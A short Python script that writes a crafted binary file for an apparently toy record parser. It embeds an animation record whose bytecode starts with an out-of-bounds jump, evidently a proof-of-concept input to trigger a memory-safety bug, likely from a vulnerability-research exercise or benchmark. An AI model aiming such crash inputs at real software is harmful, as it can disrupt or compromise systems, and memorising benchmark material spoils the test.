import struct
import sys

data = b''
data += b"A" * 32  # Merchant ID
data += b"B" * 32  # Customer ID
data += struct.pack("<I", 1)  # One record
# Record of type animation
data += struct.pack("<I", 8 + 32 + 256)  # Record size (4 bytes)
data += struct.pack("<I", 3)  # Record type (4 bytes)
data += b"A" * 31 + b'\x00'  # 32-byte message (null-terminated)

# Program to cause an invalid jump
data += b'\x09\x80\x00'  # Jump -128 bytes (possibly out of bounds)
data += b'\x07\x00\x00'  # Print message (may not execute)
data += b'\x08\x00\x00'  # End program (may not reach here)
data += b'\x08' * (256-9) # Fill the rest of the record with end program instructions

# Write the file
f = open(sys.argv[1], 'wb')
datalen = len(data) + 4  # Plus 4 bytes for the length itself
f.write(struct.pack("<I", datalen))
f.write(data)
f.close()
